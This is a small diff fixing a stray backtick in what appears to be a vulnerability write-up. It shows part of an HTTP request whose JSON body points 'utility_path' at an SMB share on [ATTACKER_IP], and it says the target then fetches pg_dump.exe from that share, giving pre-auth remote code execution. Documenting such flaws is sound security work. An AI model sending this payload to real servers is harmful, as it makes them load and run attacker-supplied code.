@@ -151,7 +151,7 @@ Connection: close
 Referer: https://[TARGETHOST]/browser/
 Content-Length: [n]
 Content-Type: application/json
-{"`utility_path":"\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]"}
+{"utility_path":"\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]"}
 ```
 
 After firing the payload, we see an incoming SMB connection at our attacker machine, retrieving the file(s) `pg_dump.exe`: Pre-Auth RCE achieved.
